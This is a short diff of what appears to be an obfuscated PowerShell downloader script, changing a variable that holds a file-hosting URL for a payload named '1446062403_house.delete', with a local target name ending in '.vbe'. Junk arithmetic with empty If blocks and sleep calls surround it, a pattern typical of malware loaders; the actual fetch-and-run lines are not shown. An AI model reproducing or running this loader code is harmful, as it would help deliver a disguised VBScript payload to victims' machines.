@@ -55,7 +55,7 @@ If($v20>0){}
 Start-Sleep -Seconds 10
 $v21=6*2-3
 If($v21>0){}
-$v22="https://www.udrop.com/file/Oo4o/1446062403_house.delete"
+$v22="https://www.udrop.com/file/OoAE/1446062403_house.delete "
 $v23="1446062403_house.vbe"
 $v24=7*2-1
 If($v24>0){}
@@ -85,3 +85,4 @@ try{
 $v37=7*2+1
 If($v37>0){}
 exit
+
